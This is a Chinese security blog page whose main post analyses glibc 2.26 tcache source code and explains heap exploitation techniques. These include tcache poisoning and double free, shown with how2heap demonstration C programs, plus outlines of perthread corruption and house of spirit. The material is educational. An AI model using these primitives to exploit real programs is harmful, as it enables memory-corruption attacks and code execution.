<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="It&apos;s not who I am underneath, but it&apos;s what I do that defines me">
<meta property="og:type" content="website">
<meta property="og:title" content="Asa9ao">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Asa9ao">
<meta property="og:description" content="It&apos;s not who I am underneath, but it&apos;s what I do that defines me">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Asa9ao">
<meta name="twitter:description" content="It&apos;s not who I am underneath, but it&apos;s what I do that defines me">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/">





  <title>Asa9ao</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Asa9ao</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/02/tcache浅析/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/02/tcache浅析/" itemprop="url">tcache浅析</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-02T18:00:31+08:00">
                2019-03-02
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#tcache源代码浅析与漏洞利用方法</p>
<p>tcache是libc2.26（ubuntu 17.10）中引入的一种新技术，其主要功能是为了提高堆管理的性能，但因为性能而放弃了很多的安全检查，导致出现了大量的新的利用方式。本文采用的是libc2.26的相关代码，在ubuntu18.04只中libc更新到了2.27，但主要改进是用了SINGLE_THREAD_P变量来优化线程方面的处理逻辑，对本文所述的内容影响不大。</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>###结构体</p>
<p>首先看看新的两个结构体，分别是tcache_entry和tcache_perthread_struct</p>
<ul>
<li><strong>tcache_entry</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
<p>它链接chunk成一个类似fastbin的单向列表，其中的next指针指向的是下一个chunk，但是要特别注意一点，它并不是fd或者bk那样指向chunk的起始位置的，它指向的是user data</p>
<ul>
<li><strong>tcache_perthread_struct</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS]; </span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<p>tcache_prethread_struct是整个tcache的管理结构，每一个thread都会维护一个该结构，而它维护着64个entry（每一个entry都维护着相同size的chunk），每个entry又维护着自己的chunk。而counts则是记录着每个entry所维护的chunk，最多不能超过7个，具体如图所示：</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1g0opfg21v1j30nh0cin02.jpg" alt="img"></p>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ul>
<li><strong>几个内存管理常见的函数</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem2chunk(m) </span></span><br><span class="line">	( (struct malloc_chunk*)((<span class="keyword">char</span>*)m - offsetof(struct malloc_chunk, fd)) )</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(c) </span></span><br><span class="line">	( (<span class="keyword">void</span>*)((<span class="keyword">char</span>*)c + offsetof(struct malloc_chunk, fd)) )</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size2request(sz) </span></span><br><span class="line">	(sz - <span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>__libc_malloc</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);		<span class="comment">//将输入的size转换为实际的size</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);		<span class="comment">//根据size计算相应的index		</span></span><br><span class="line">  MAYBE_INIT_TCACHE (); 					<span class="comment">//该函数在tcache为空时会调用__tcache_init()</span></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins  			<span class="comment">//根据index判断size是否满足tcache</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache								<span class="comment">//tcache存在</span></span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) 	<span class="comment">//通过index找到相应的entry并检查里面是否有chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);			<span class="comment">//如果有的话就调用get分配该chunk</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>__tcache_init()</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">tcache_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;					<span class="comment">//malloc_state的指针</span></span><br><span class="line">  <span class="keyword">void</span> *victim = <span class="number">0</span>;				</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);	<span class="comment">//拿到了该结构体的size</span></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)				<span class="comment">//判断tcache是否关闭</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  arena_get (ar_ptr, bytes); 	<span class="comment">//找到可用的arena</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes); <span class="comment">// 申请一个size大小的空间</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)			<span class="comment">//判断是否申请成功且是否找到了arena</span></span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);		<span class="comment">//再次尝试寻找arena</span></span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);			<span class="comment">//再次尝试分配一个size大小的空间</span></span><br><span class="line">    &#125;	</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)				<span class="comment">//如果找不到了arena</span></span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn't enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)						</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim; 		<span class="comment">//用申请到的空间更新tcache</span></span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));	  <span class="comment">//空间内数据全部置为0		</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里就成功建立了tcache_perthread_struct了</p>
<ul>
<li><strong>tcache_get()</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __<span class="function">always_inline <span class="keyword">void</span> *  <span class="title">tcache_get</span> <span class="params">(<span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];	<span class="comment">//根据计算出的index拿到相应的entry</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);			<span class="comment">//判断index是否合法</span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);			<span class="comment">//判断是否有chunk</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;			<span class="comment">//entry的第一个变成了原来的next</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); 					<span class="comment">//获得一个 chunk，counts 减一</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;							<span class="comment">//返回一个chunk</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>__libc_free()</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line"> ...</span><br><span class="line">  MAYBE_INIT_TCACHE ();					<span class="comment">//该函数在tcache为空时会调用__tcache_init()</span></span><br><span class="line">  ar_ptr = arena_for_chunk (p);			<span class="comment">//拿到了对应arena的指针(就是malloc state)</span></span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);				<span class="comment">//调用函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>_int_free()</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> _int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);					<span class="comment">//根据size计算index</span></span><br><span class="line">    <span class="keyword">if</span> (tcache											<span class="comment">//判断tcache是否存在</span></span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins 					<span class="comment">//判断index是否是合法的</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) 	<span class="comment">//判断相应entry的chunk数量是否合法</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);							<span class="comment">//调用函数</span></span><br><span class="line">        <span class="keyword">return</span>;						</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>tcache_put()</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __<span class="function">always_inline <span class="keyword">void</span> <span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);	<span class="comment">//拿到相应的entry</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);					<span class="comment">//判断index是否合法		</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];					<span class="comment">//e的next为index对应的entry</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;							<span class="comment">//index对应的entry设置为了e</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);							<span class="comment">//该index对应的count的数量加1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>###概括</p>
<p>以上就是所有涉及到的相关函数，简单梳理一下逻辑大概如下所示：</p>
<ul>
<li>第一次malloc时，会首先malloc空间来存放tcache_perthread_struct    </li>
<li><p>free时，转换size，如果size在fastbins和smallbins的话，根据size计算出index</p>
<ul>
<li>相应index的entry的chunk大于7时，则和libc2.23相似，进入smallbins或fastbins</li>
<li>相应index的entry的chunk小于7时，则放入相应的entry（此时的pre_inuse位不会被修改，也就是说和fastbins一样不会发生合并）</li>
</ul>
</li>
<li><p>malloc时，转换size，如果size在fabins和smallbins的话，根据size计算出index</p>
<ul>
<li>相应index的entry的chunk不为空，直接分配</li>
<li>相应index的enrty为空，如果其余bins中有合适的话就放入entry，然后再分配</li>
<li>以上情况外，按以往的方式处理</li>
</ul>
</li>
</ul>
<p>##漏洞分析</p>
<p>对比起libc2.23时代，tcache的引入大大减少了_int_malloc()的使用次数，所以原有的安全检查机制几乎发挥不了作用，而tcache优先级极高，其相关操作本身又没有太多的check，所以就有了许多新的利用方式。</p>
<h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><p>参考how2heap，代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The address we want malloc() to return is %p.\n"</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line">	<span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(128): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	a[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(128): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the tcache list has [ %p ].\n"</span>, &amp;stack_var);</span><br><span class="line">	<span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(128): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We got the control\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所谓的tcache poisoning实际上就是fastbin dup into stack的简化版，原理很简单，首先malloc一个size在tcache内的chunk，然后free使其进入entry的链表，最后就是覆盖next指针成为你想要的地址，这样就会让系统产生一个错觉，认为entry的链表如下所示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1 - &gt; fake chunk</span><br></pre></td></tr></table></figure>
<p>我们第一次malloc时分配的还是chunk1，而第二次的malloc就会是fake chunk了</p>
<h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h3><p>这个漏洞主要是利用的tcache_put()，通过上面的源码分析我们可以看到put没有一个很重要的检测—当前free的chunk是否已经被free过了，这就导致我们可以多次free一个chunk，还是参考how2heap的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with tcache.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating buffer.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing twice...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p ].\n"</span>, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Next allocated buffers will be same: [ %p, %p ].\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>), <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们的a成功free了两次，也成功malloc了两次</p>
<p>###tcache perthread corruption</p>
<p>这是一种很特殊的利用方法，源码中我们可以知道所有的free都是要和tcache_perthread_struct所维护的index的max进行比较从而确认chunk是否会进入tcache的，那么如果我们能控制tcache_perthread_struct的话岂不是就可以导致<strong>任意size的chunk都可以触发tcache漏洞</strong>？</p>
<p>这种利用方法还没有很好的例子，我们可以想像一下：</p>
<ul>
<li>利用tcache poisoning将next改到cache_perthread_struct的位置</li>
<li>malloc两次拿到我们想要的位置</li>
<li>根据偏移进行修改</li>
</ul>
<h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h3><p>这个不在多说了，就是利用更加简单了</p>
<p>###tcache_cache_filling_unlink</p>
<p>相关代码在github上有，也就不在赘述了</p>
<p><a href="https://github.com/ktecv2000/tcache-exploitation/blob/master/tcache_cache_filling_unlink.c" target="_blank" rel="noopener">https://github.com/ktecv2000/tcache-exploitation/blob/master/tcache_cache_filling_unlink.c</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/02/Unlink实战-2014-HITCON-stkof/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/02/Unlink实战-2014-HITCON-stkof/" itemprop="url">Unlink实战 -- 2014 HITCON stkof</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-02T12:13:14+08:00">
                2019-03-02
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
